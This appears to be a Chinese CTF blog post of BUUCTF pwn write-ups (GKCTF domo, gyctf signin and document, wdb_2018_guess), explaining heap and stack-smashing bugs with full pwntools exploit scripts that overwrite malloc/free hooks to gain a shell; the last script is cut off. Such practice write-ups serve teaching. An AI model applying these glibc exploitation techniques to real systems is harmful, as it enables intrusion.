

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>BUUCTF 刷题记录 - Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    
      
      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">

<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-09-28 19:24" pubdate>
        2020年9月28日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      9k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      145
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">BUUCTF 刷题记录</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。<br>其中add和free 函数，上来都会检测<code>free_hook malloc_hook</code> 是否不为0，不为0就不让进行相应的操作。</p>
<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0L</span>L &amp;&amp; nbytes &lt;= <span class="hljs-number">0x120</span> )
       &#123;
         heaplist[SHIDWORD(nbytes)] = <span class="hljs-built_in">malloc</span>(nbytes);
         <span class="hljs-built_in">puts</span>(<span class="hljs-string">"content:"</span>);
         read(<span class="hljs-number">0</span>, heaplist[SHIDWORD(nbytes)], nbytes);
         *(heaplist[SHIDWORD(nbytes)] + nbytes) = <span class="hljs-number">0</span>;<span class="hljs-comment">// off by null</span>
         ++counts;
       &#125;</code></pre></div>

<p>Add中存在<code>OFF BY NULL</code>。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>利用off by null 构造一个堆重叠</li>
<li>泄漏出libc地址</li>
<li>2次释放重叠的chunk，进行fastbin attack <code>malloc_hook_</code>为 one gadget</li>
<li>通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./domo'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27019</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-string">'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
'''</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'tent'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))


add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'1'</span>) 
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) 
add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)
add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'1'</span>) 
free(<span class="hljs-number">1</span>)
free(<span class="hljs-number">0</span>)
data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>)
add(<span class="hljs-number">0x68</span>,data)
free(<span class="hljs-number">2</span>)

add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x00'</span>)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'\x00'</span>)

add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)

free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">5</span>)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">4</span>)
r()
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b31</span>
info_addr(<span class="hljs-string">'libc_base '</span>,libc_base)

malloc_hook=libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
realloc_hook=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>]
add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
onegadget = <span class="hljs-number">0x4526a</span> + libc_base

data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb</span>+p64(onegadget)+ p64(realloc_hook+realloc[<span class="hljs-number">0</span>])
add(<span class="hljs-number">0x68</span>,data)
sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">500</span>)

<span class="hljs-comment"># debug()</span>
itr()</code></pre></div>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul>
<li>还可以攻击<code>calloc_hook</code>,因为seccomp里面调用了calloc。</li>
<li>攻击io file 进行泄漏和orw。（先等待复现）<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li>
</ul>
<h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul>
<li>uaf，但是存在一个flag位用于检测是否free过</li>
<li>edit只能一次</li>
<li>存在后门函数，其中还会用calloc申请一个chunk,并且只需要<code>0x004040C0</code>处有数值即可触发。</li>
</ul>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="calloc-的特性："><a href="#calloc-的特性：" class="headerlink" title="calloc 的特性："></a>calloc 的特性：</h4><ul>
<li>在申请到的chunk上会进行一个置零的操作</li>
<li>不会从tcache bin 中取chunk <h4 id="tcache-的-int-malloc有以下特性："><a href="#tcache-的-int-malloc有以下特性：" class="headerlink" title="tcache 的_int_malloc有以下特性："></a>tcache 的<code>_int_malloc</code>有以下特性：</h4></li>
</ul>
<p>在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用<code>tcache_put</code>把它们全部放入 tcache 中(smallbins中也是如此)。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* While we're here, if we see other chunks of the same size,
 stash them in the tcache.  */</span>
  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);
  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
&#123;
  mchunkptr tc_victim;
  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>
  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)
    &#123;
      REMOVE_FB (fb, tc_victim, pp);
      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)
    &#123;
      tcache_put (tc_victim, tc_idx);
&#125;
    &#125;
&#125;</code></pre></div>

<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>申请8个堆， 释放8个堆，最后一个会进入fastbin</li>
<li>edit idx=8 的chunk，改其fd为<code>0x004040C0 - 0x10</code></li>
<li>申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位</li>
<li>调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache</li>
<li>丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。</li>
</ul>
<p>漏洞产生原因也是，libc源码中<code>tcache_put</code>基本没有安全检查。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./gyctf_2020_signin'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27592</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))
    s(str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'idx'</span>,str(idx))


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
    add(i)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
    free(i)


edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span><span class="hljs-number">-0x10</span>))
add(<span class="hljs-number">8</span>)
sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'6'</span>)
debug()
itr()</code></pre></div>

<h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。</p>
<h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul>
<li>存在uaf漏洞</li>
<li>只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。</li>
</ul>
<h4 id="person数据结构"><a href="#person数据结构" class="headerlink" title="person数据结构"></a>person数据结构</h4><div class="hljs"><pre><code class="hljs undefined">                                                                                                   

<span class="angelscript">┌──────────────────────┬────┐              
│                      │<span class="hljs-number">0x21</span>│              
├─────────────┬────────┴────┤              
│             │             │              
│   main_heap │    flag     │              
├─────────────┴─────────────┤              
│                       <span class="hljs-number">0x91</span>│              
│─────────────┬─────────────┤              
│             │             ├──────▶<span class="hljs-number">0x10</span>   
│     name    │      sex    │              
├─────────────▼─────────────┤              
│                           │              
│                           │              
│                           │              
│                           │              
│                           │              
│          data             │              
│                           │       ┌────┐ 
│                           ├──────▶│<span class="hljs-number">0x80</span>│ 
│                           │       └────┘ 
│                           │              
│                           │              
│                           │              
│                           │              
└───────────────────────────┘</span></code></pre></div>

<h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>释放一个0x90的堆，利用uaf进行泄漏libc</li>
<li>申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头</li>
<li>edit这个释放的堆，控制其中<code>main_heap</code>的地址，然后进行任意地址写。</li>
</ul>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./gyctf_2020_document'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25009</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)
    sa(<span class="hljs-string">'name'</span>,str(name))
    sa(<span class="hljs-string">'sex'</span>,str(sex))
    sa(<span class="hljs-string">'infor'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'index'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,sex,data)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sa(<span class="hljs-string">'sex'</span>,str(sex))
    sa(<span class="hljs-string">'infor'</span>,str(data))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)
    sla(<span class="hljs-string">'index'</span>,str(idx))
data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x78</span>
add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)
add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)
free(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
r()
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)
add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)
free_hook = <span class="hljs-number">0x3c67a8</span> + libc_base
data = <span class="hljs-string">'\x00'</span>* <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x71</span>) + p64(free_hook<span class="hljs-number">-0x10</span>) + <span class="hljs-string">'\x01'</span> * <span class="hljs-number">0x58</span>
edit(<span class="hljs-number">0</span>,<span class="hljs-string">"N"</span>,data)
data = p64(libc_base + <span class="hljs-number">0x4526a</span>) + <span class="hljs-number">0x68</span> * <span class="hljs-string">'\x00'</span>
edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,data)
free(<span class="hljs-number">0</span>)
itr()</code></pre></div>

<h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>主要就是利用stack smashing。</p>
<h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code>函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)
&#123;
  __fortify_fail (<span class="hljs-string">"stack smashing detected"</span>);
&#125;
<span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)
&#123;
  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span>
  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">"*** %s ***: %s terminated\n"</span>,
                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">"&lt;unknown&gt;"</span>);
&#125;</code></pre></div>

<p>所以说如果我们利用栈溢出覆盖 <code>argv[0]</code> 为我们想要输出的字符串的地址，那么在 <strong><code>fortify_fail</code> 函数中就会输出我们想要的信息。</strong></p>
<p>注意其是%s来打印东西的，所以在利用时要用<code>argv[0]</code>做个跳板。</p>
<h5 id="如何获取栈值"><a href="#如何获取栈值" class="headerlink" title="如何获取栈值"></a>如何获取栈值</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p>
<p>Libc上的<code>_environ</code>存放着当前进程的环境变量，其是一个栈地址。</p>
<p>以此来获取栈值，然后根据偏移来访问栈中的数据。</p>
<h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>获取libc基地址</li>
<li>获取stack地址，根据偏移找到存放flag的stack address</li>
<li>覆盖<code>argv[0]</code>为flag的stack address</li>
</ul>
<p>其中每次都是用gets 覆盖到覆盖<code>argv[0]</code>  ,stack smashing来完成。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># encoding: utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./GUESS'</span>
elf = ELF(local_file)
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26813</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
